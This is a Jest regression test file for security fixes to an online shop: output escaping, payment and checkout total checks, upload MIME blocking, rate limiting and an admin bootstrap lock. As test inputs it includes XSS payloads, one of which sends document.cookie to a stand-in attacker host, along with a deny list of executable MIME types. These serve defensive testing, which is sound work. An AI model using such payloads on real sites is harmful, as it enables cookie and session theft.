/**
 * Regression tests for verified security fixes applied 2026-06-25.
 * These tests encode the exact attack vectors from the certification audit
 * so they cannot regress silently.
 *
 * Tests are self-contained — no Firebase SDK or network calls.
 */

"use strict";

/* ─────────────────────────────────────────────────────────────
   1. HTML escaping (XSS Fix — script.js:_escHtml)
   Verifies the escaper correctly neutralises all 5 dangerous chars.
───────────────────────────────────────────────────────────── */
describe("_escHtml — XSS output escaping", () => {
  const _escHtml = s => String(s||'').replace(
    /[&<>"']/g,
    c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]
  );

  test("escapes < and > (script tag)", () => {
    expect(_escHtml('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  test("escapes & (entity injection)", () => {
    expect(_escHtml('a & b')).toBe('a &amp; b');
  });

  test("escapes double-quote (attribute escape)", () => {
    expect(_escHtml('"hello"')).toBe('&quot;hello&quot;');
  });

  test("escapes single-quote (onclick injection)", () => {
    expect(_escHtml("');alert(1);//")).toBe('&#39;);alert(1);//');
  });

  test("handles null and undefined safely", () => {
    expect(_escHtml(null)).toBe('');
    expect(_escHtml(undefined)).toBe('');
  });

  test("handles numbers", () => {
    expect(_escHtml(42)).toBe('42');
  });

  test("passes through safe strings unchanged", () => {
    expect(_escHtml('Normal Product Name')).toBe('Normal Product Name');
  });

  test("stored XSS payload from product name is neutralised", () => {
    const maliciousName = '<img src=x onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">';
    const escaped = _escHtml(maliciousName);
    /* The opening angle bracket must be escaped — the img element cannot be parsed */
    expect(escaped).not.toContain('<img');
    expect(escaped).toContain('&lt;img');
    /* The attribute delimiter (") must be escaped so the attribute value cannot be injected */
    expect(escaped).not.toContain('"fetch(');
    expect(escaped).toContain('&quot;fetch(');
    /* The word "onerror" is safe text once the enclosing tag is broken */
  });

  test("DOM XSS payload via onclick attribute injection is neutralised", () => {
    const maliciousName = "');alert(document.cookie);//";
    const escaped = _escHtml(maliciousName);
    expect(escaped).not.toContain("'");
    expect(escaped).toContain('&#39;');
  });
});

/* ─────────────────────────────────────────────────────────────
   2. KASS tool loop depth limit
   Verifies MAX_TOOL_ITERATIONS guard prevents infinite loops.
───────────────────────────────────────────────────────────── */
describe("KASS tool loop depth limit", () => {
  const MAX_TOOL_ITERATIONS = 10;

  async function simulateKassLoop(responses) {
    let currentMessages = [{ role: "user", content: "test" }];
    let finalResponse = "";
    let _iterations = 0;
    let callCount = 0;

    while (_iterations < MAX_TOOL_ITERATIONS) {
      _iterations++;
      const response = responses[callCount++] || { stop_reason: "end_turn", content: [] };

      if (response.stop_reason === "end_turn") {
        finalResponse = response.content.map(b => b.type === "text" ? b.text : "").join("").trim();
        break;
      }

      if (response.stop_reason === "tool_use") {
        currentMessages = [
          ...currentMessages,
          { role: "assistant", content: response.content },
          { role: "user", content: [{ type: "tool_result", tool_use_id: "t1", content: "{}" }] },
        ];

        if (_iterations >= MAX_TOOL_ITERATIONS) {
          finalResponse = "I've reached my search limit for this request.";
        }
        continue;
      }

      break;
    }

    return { finalResponse, iterations: _iterations, callCount };
  }

  test("resolves normally when end_turn is reached within limit", async () => {
    const responses = [
      { stop_reason: "tool_use", content: [{ type: "tool_use", id: "t1", name: "search" }] },
      { stop_reason: "end_turn", content: [{ type: "text", text: "Here is your answer." }] },
    ];
    const { finalResponse, iterations } = await simulateKassLoop(responses);
    expect(finalResponse).toBe("Here is your answer.");
    expect(iterations).toBe(2);
  });

  test("terminates at MAX_TOOL_ITERATIONS when AI keeps requesting tools", async () => {
    const infiniteToolResponse = {
      stop_reason: "tool_use",
      content: [{ type: "tool_use", id: "t1", name: "search" }],
    };
    const responses = Array(15).fill(infiniteToolResponse);
    const { iterations } = await simulateKassLoop(responses);
    expect(iterations).toBe(MAX_TOOL_ITERATIONS);
  });

  test("sets a user-friendly fallback message when limit is hit", async () => {
    const infiniteToolResponse = {
      stop_reason: "tool_use",
      content: [{ type: "tool_use", id: "t1", name: "search" }],
    };
    const responses = Array(15).fill(infiniteToolResponse);
    const { finalResponse } = await simulateKassLoop(responses);
    expect(finalResponse).toContain("search limit");
  });
});

/* ─────────────────────────────────────────────────────────────
   3. Payment price verification (server-side order total check)
   Verifies the logic that guards against paying KES 1 for
   a KES 50,000 product.
───────────────────────────────────────────────────────────── */
describe("verifyIntasendPayment — server-side price verification", () => {

  function computeServerTotal(orderItems, priceMap) {
    let serverTotal = 0;
    let unknownItems = 0;
    for (const item of orderItems) {
      const pid = String(item.id || item.productId || "");
      if (!pid || !priceMap[pid]) { unknownItems++; continue; }
      const prod = priceMap[pid];
      const unitPrice = Number(prod.salePrice || prod.price || 0);
      serverTotal += unitPrice * (Math.max(1, Number(item.qty) || Number(item.quantity) || 1));
    }
    return { serverTotal, unknownItems };
  }

  function wouldRejectPayment(confirmedAmount, serverTotal) {
    return serverTotal > 0 && confirmedAmount < serverTotal - 1;
  }

  const priceMap = {
    "prod_a": { price: 50000 },
    "prod_b": { price: 1500, salePrice: 1200 },
    "prod_c": { price: 200 },
  };

  test("passes when confirmedAmount exactly covers serverTotal", () => {
    const orderItems = [{ id: "prod_a", qty: 1 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(wouldRejectPayment(50000, serverTotal)).toBe(false);
  });

  test("passes when confirmedAmount exceeds serverTotal (over-payment)", () => {
    const orderItems = [{ id: "prod_c", qty: 1 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(wouldRejectPayment(300, serverTotal)).toBe(false);
  });

  test("passes with 1 KES rounding tolerance", () => {
    const orderItems = [{ id: "prod_c", qty: 1 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(serverTotal).toBe(200);
    expect(wouldRejectPayment(199, serverTotal)).toBe(false);
  });

  test("BLOCKS the verified exploit: paying KES 1 for KES 50,000 item", () => {
    const orderItems = [{ id: "prod_a", qty: 1 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(serverTotal).toBe(50000);
    expect(wouldRejectPayment(1, serverTotal)).toBe(true);
  });

  test("BLOCKS partial underpayment", () => {
    const orderItems = [{ id: "prod_a", qty: 1 }, { id: "prod_c", qty: 2 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(serverTotal).toBe(50400);
    expect(wouldRejectPayment(1000, serverTotal)).toBe(true);
  });

  test("uses salePrice when present over price", () => {
    const orderItems = [{ id: "prod_b", qty: 1 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(serverTotal).toBe(1200);
  });

  test("multiplies by quantity correctly", () => {
    const orderItems = [{ id: "prod_c", qty: 3 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(serverTotal).toBe(600);
  });

  test("skips items with unknown product IDs", () => {
    const orderItems = [{ id: "prod_unknown", qty: 1 }];
    const { serverTotal, unknownItems } = computeServerTotal(orderItems, priceMap);
    expect(serverTotal).toBe(0);
    expect(unknownItems).toBe(1);
  });

  test("does not reject when serverTotal is 0 (all items unknown)", () => {
    const orderItems = [{ id: "ghost_product", qty: 1 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(wouldRejectPayment(1, serverTotal)).toBe(false);
  });

  test("uses productId field when id is absent", () => {
    const orderItems = [{ productId: "prod_a", qty: 1 }];
    const { serverTotal } = computeServerTotal(orderItems, priceMap);
    expect(serverTotal).toBe(50000);
  });
});

/* ─────────────────────────────────────────────────────────────
   4. SVG upload block — notExecutable() logic
   Verifies that image/svg+xml is rejected alongside other
   executable MIME types.
───────────────────────────────────────────────────────────── */
describe("Storage rules — SVG upload rejection", () => {
  function notExecutable(contentType) {
    return !(
      /^application\/x-/.test(contentType)
      || /^text\/x-/.test(contentType)
      || contentType === 'application/octet-stream'
      || /^application\/java-/.test(contentType)
      || contentType === 'application/vnd.microsoft.portable-executable'
      || contentType === 'application/x-msdownload'
      || contentType === 'application/x-dosexec'
      || contentType === 'text/html'
      || contentType === 'text/javascript'
      || contentType === 'application/javascript'
      || contentType === 'image/svg+xml'
    );
  }

  test("blocks image/svg+xml", () => {
    expect(notExecutable('image/svg+xml')).toBe(false);
  });

  test("blocks text/html", () => {
    expect(notExecutable('text/html')).toBe(false);
  });

  test("blocks application/javascript", () => {
    expect(notExecutable('application/javascript')).toBe(false);
  });

  test("allows image/jpeg", () => {
    expect(notExecutable('image/jpeg')).toBe(true);
  });

  test("allows image/png", () => {
    expect(notExecutable('image/png')).toBe(true);
  });

  test("allows image/webp", () => {
    expect(notExecutable('image/webp')).toBe(true);
  });

  test("allows video/mp4", () => {
    expect(notExecutable('video/mp4')).toBe(true);
  });

  test("allows application/pdf", () => {
    expect(notExecutable('application/pdf')).toBe(true);
  });
});

/* ─────────────────────────────────────────────────────────────
   5. addToWishlist — ID-based lookup (no onclick injection)
   Verifies the new ID-based lookup matches products correctly
   and that the old name-based path cannot be triggered from
   an onclick attribute.
───────────────────────────────────────────────────────────── */
describe("addToWishlist — safe ID-based product lookup", () => {
  const _mkSafe = id => String(id||'').replace(/[^a-zA-Z0-9_-]/g,'');

  const products = [
    { id: "prod_001", name: "Normal Product",         price: 500 },
    { id: "prod_002", name: "<script>alert(1)</script>", price: 999 },
    { id: "prod_003", name: "');alert(1);//",          price: 100 },
  ];

  function findByProductId(productId, productList) {
    return productList.find(p => _mkSafe(p.id) === productId) || null;
  }

  test("finds a product by sanitized ID", () => {
    const found = findByProductId("prod_001", products);
    expect(found).not.toBeNull();
    expect(found.name).toBe("Normal Product");
  });

  test("does not find non-existent ID", () => {
    expect(findByProductId("ghost_id", products)).toBeNull();
  });

  test("sanitized ID cannot contain XSS payload", () => {
    const maliciousId = '<script>alert(1)</script>';
    const safeId = _mkSafe(maliciousId);
    expect(safeId).toBe('scriptalert1script');
    expect(safeId).not.toContain('<');
    expect(safeId).not.toContain('>');
  });

  test("product with XSS name is found safely by ID, not by name", () => {
    const safeId = _mkSafe("prod_002");
    const found = findByProductId(safeId, products);
    expect(found).not.toBeNull();
    expect(found.name).toBe("<script>alert(1)</script>");
  });
});

/* ─────────────────────────────────────────────────────────────
   6. createCheckoutSession — server-side cart locking
   Verifies that the session logic computes authoritative totals,
   caps delivery fees, rejects empty carts, and handles unknown
   product IDs gracefully.
───────────────────────────────────────────────────────────── */
describe("createCheckoutSession — server-side cart locking", () => {
  const catalogue = {
    "prod_a": { name: "Phone",   price: 50000 },
    "prod_b": { name: "Case",    price: 500,  salePrice: 400 },
    "prod_c": { name: "Charger", price: 1500 },
  };

  function buildSession(cartItems, deliveryFee = 0) {
    const sessionItems = [];
    let serverSubtotal = 0;
    for (const item of cartItems) {
      const pid  = String(item.productId || "");
      const prod = catalogue[pid];
      if (!prod) continue;
      const unitPrice = Number(prod.salePrice || prod.price);
      const qty       = Math.max(1, Math.min(99, Math.round(Number(item.qty) || 1)));
      sessionItems.push({ productId: pid, unitPrice, qty, lineTotal: unitPrice * qty });
      serverSubtotal += unitPrice * qty;
    }
    const safeDeliveryFee = Math.max(0, Math.min(5000, Math.round(Number(deliveryFee) || 0)));
    const serverTotal     = Math.round(serverSubtotal + safeDeliveryFee);
    return { sessionItems, serverTotal, deliveryFee: safeDeliveryFee };
  }

  test("computes correct total for a simple cart", () => {
    const { serverTotal } = buildSession([{ productId: "prod_a", qty: 1 }]);
    expect(serverTotal).toBe(50000);
  });

  test("uses salePrice when available", () => {
    const { serverTotal } = buildSession([{ productId: "prod_b", qty: 1 }]);
    expect(serverTotal).toBe(400);
  });

  test("multiplies by quantity", () => {
    const { serverTotal } = buildSession([{ productId: "prod_c", qty: 3 }]);
    expect(serverTotal).toBe(4500);
  });

  test("includes delivery fee in total", () => {
    const { serverTotal } = buildSession([{ productId: "prod_a", qty: 1 }], 200);
    expect(serverTotal).toBe(50200);
  });

  test("caps delivery fee at KES 5,000", () => {
    const { deliveryFee, serverTotal } = buildSession([{ productId: "prod_c", qty: 1 }], 99999);
    expect(deliveryFee).toBe(5000);
    expect(serverTotal).toBe(1500 + 5000);
  });

  test("skips unknown product IDs", () => {
    const { sessionItems, serverTotal } = buildSession([
      { productId: "prod_a", qty: 1 },
      { productId: "ghost",  qty: 5 },
    ]);
    expect(sessionItems).toHaveLength(1);
    expect(serverTotal).toBe(50000);
  });

  test("returns empty items for an all-unknown cart", () => {
    const { sessionItems, serverTotal } = buildSession([{ productId: "ghost", qty: 1 }]);
    expect(sessionItems).toHaveLength(0);
    expect(serverTotal).toBe(0);
  });

  test("multi-item cart sums correctly", () => {
    const { serverTotal } = buildSession([
      { productId: "prod_a", qty: 1 },
      { productId: "prod_b", qty: 2 },
      { productId: "prod_c", qty: 1 },
    ]);
    expect(serverTotal).toBe(50000 + 400 * 2 + 1500);
  });
});

/* ─────────────────────────────────────────────────────────────
   7. verifyIntasendPayment + session — session-path integrity
   Verifies that the session path:
   - Rejects payments below session.serverTotal
   - Accepts overpayment
   - Blocks consumed sessions
   - Blocks expired sessions
───────────────────────────────────────────────────────────── */
describe("verifyIntasendPayment — session integrity path", () => {
  const SESSION_TOTAL = 50000;

  function checkSessionPayment({ confirmedAmount, session }) {
    if (!session.exists)                        return { ok: false, reason: "not_found" };
    if (session.data.status !== "pending")      return { ok: false, reason: "already_used" };
    const now = Date.now();
    if (session.data.expiresAt < now)           return { ok: false, reason: "expired" };
    const sessionTotal = session.data.serverTotal;
    if (confirmedAmount < sessionTotal - 1)     return { ok: false, reason: "underpayment" };
    return { ok: true };
  }

  const now = Date.now();

  const pendingSession = {
    exists: true,
    data: { status: "pending", serverTotal: SESSION_TOTAL, expiresAt: now + 1800000 },
  };

  test("accepts exact payment via session", () => {
    expect(checkSessionPayment({ confirmedAmount: SESSION_TOTAL, session: pendingSession }).ok).toBe(true);
  });

  test("accepts overpayment via session", () => {
    expect(checkSessionPayment({ confirmedAmount: SESSION_TOTAL + 100, session: pendingSession }).ok).toBe(true);
  });

  test("accepts payment within KES 1 rounding tolerance", () => {
    expect(checkSessionPayment({ confirmedAmount: SESSION_TOTAL - 1, session: pendingSession }).ok).toBe(true);
  });

  test("rejects underpayment via session", () => {
    const result = checkSessionPayment({ confirmedAmount: 1, session: pendingSession });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("underpayment");
  });

  test("rejects a consumed session", () => {
    const consumed = { exists: true, data: { ...pendingSession.data, status: "consumed" } };
    expect(checkSessionPayment({ confirmedAmount: SESSION_TOTAL, session: consumed }).reason).toBe("already_used");
  });

  test("rejects a non-existent session", () => {
    expect(checkSessionPayment({ confirmedAmount: SESSION_TOTAL, session: { exists: false } }).reason).toBe("not_found");
  });

  test("rejects an expired session", () => {
    const expired = { exists: true, data: { ...pendingSession.data, expiresAt: now - 1000 } };
    expect(checkSessionPayment({ confirmedAmount: SESSION_TOTAL, session: expired }).reason).toBe("expired");
  });
});

/* ─────────────────────────────────────────────────────────────
   8. Firestore-backed rate limiter — checkRateLimitDurable
   Verifies the rate limit counting logic (window reset, overflow).
───────────────────────────────────────────────────────────── */
describe("checkRateLimitDurable — rate limit logic", () => {
  function buildWindow(countSoFar, windowSecs, limit) {
    const windowMs   = windowSecs * 1000;
    const windowStart = Date.now() - 500; /* started 0.5s ago — within window */
    const newCount   = countSoFar + 1;
    const windowExpired = (Date.now() - windowStart) >= windowMs;
    const effectiveCount = windowExpired ? 1 : newCount;
    return { effectiveCount, ok: effectiveCount <= limit };
  }

  test("allows first request", () => {
    expect(buildWindow(0, 60, 10).ok).toBe(true);
  });

  test("allows requests within limit", () => {
    expect(buildWindow(8, 60, 10).ok).toBe(true);  /* count would be 9 */
  });

  test("allows request at exactly the limit", () => {
    expect(buildWindow(9, 60, 10).ok).toBe(true);  /* count = 10 = limit */
  });

  test("blocks the request that exceeds the limit", () => {
    expect(buildWindow(10, 60, 10).ok).toBe(false); /* count = 11 > 10 */
  });

  test("resets count when window expires", () => {
    /* windowStart far in the past — window has expired */
    const windowMs = 60 * 1000;
    const staleStart = Date.now() - windowMs - 5000;
    const windowExpired = (Date.now() - staleStart) >= windowMs;
    expect(windowExpired).toBe(true);
    /* On expiry, count resets to 1 → always ok for limit >= 1 */
    const effectiveCount = windowExpired ? 1 : 999;
    expect(effectiveCount <= 10).toBe(true);
  });
});

/* ─────────────────────────────────────────────────────────────
   9. Bootstrap lockdown — permanent lock flag
   Verifies that once the bootstrap flag is set, subsequent
   calls are blocked regardless of other state.
───────────────────────────────────────────────────────────── */
describe("bootstrapAdminClaim — permanent lock guard", () => {
  function checkBootstrapAllowed({ lockDoc, hasAdminInDB, hasAdminClaim }) {
    if (lockDoc && lockDoc.locked === true)   return { allowed: false, reason: "lock_set" };
    if (hasAdminInDB)                         return { allowed: false, reason: "admin_exists" };
    if (hasAdminClaim)                        return { allowed: false, reason: "claim_exists" };
    return { allowed: true };
  }

  test("allows bootstrap when no lock, no admin in DB, no claim", () => {
    expect(checkBootstrapAllowed({ lockDoc: null, hasAdminInDB: false, hasAdminClaim: false }).allowed).toBe(true);
  });

  test("blocks when permanent lock is set", () => {
    const result = checkBootstrapAllowed({ lockDoc: { locked: true }, hasAdminInDB: false, hasAdminClaim: false });
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("lock_set");
  });

  test("blocks when lock is set even if DB admin was deleted", () => {
    /* Attacker deletes users collection but lock remains */
    const result = checkBootstrapAllowed({ lockDoc: { locked: true }, hasAdminInDB: false, hasAdminClaim: false });
    expect(result.allowed).toBe(false);
  });

  test("blocks when admin exists in DB (no lock)", () => {
    const result = checkBootstrapAllowed({ lockDoc: null, hasAdminInDB: true, hasAdminClaim: false });
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("admin_exists");
  });

  test("blocks when admin claim already exists (no lock)", () => {
    const result = checkBootstrapAllowed({ lockDoc: null, hasAdminInDB: false, hasAdminClaim: true });
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("claim_exists");
  });
});
